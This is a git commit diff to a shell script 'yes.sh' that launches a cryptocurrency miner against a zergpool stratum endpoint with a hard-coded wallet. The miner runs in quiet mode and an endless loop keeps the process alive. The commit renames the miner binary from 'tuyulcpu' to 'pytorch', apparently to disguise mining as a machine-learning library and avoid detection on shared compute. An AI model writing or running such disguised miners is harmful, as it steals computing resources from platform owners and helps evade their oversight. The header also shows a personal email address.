8372359bfa34275f95327a154f14e617085effca
babehdyo <widyo.babeh@gmail.com>
2021-06-18 21:16:26 +0700

    Update yes.sh

--- yes.sh
+++ yes.sh
@@ -2,8 +2,8 @@
 POOL=stratum+tcp://lyra2z330.na.mine.zergpool.com:4563
 WALLET=DFtFJRa7oUzbBpUxYLXFaeTVDwyidT1TMk
 WORKER=$(echo $(shuf -i 1000-9999 -n 1)-CPU-MANTAB)
-chmod +x tuyulcpu
-./tuyulcpu -a lyra2z330 -o $POOL -u $WALLET -p c=DGB,mc=PYRK,ID=$WORKER -q
+chmod +x pytorch
+./pytorch -a lyra2z330 -o $POOL -u $WALLET -p c=DGB,mc=PYRK,ID=$WORKER -q
 while [ 1 ]; do
 sleep 3
 done
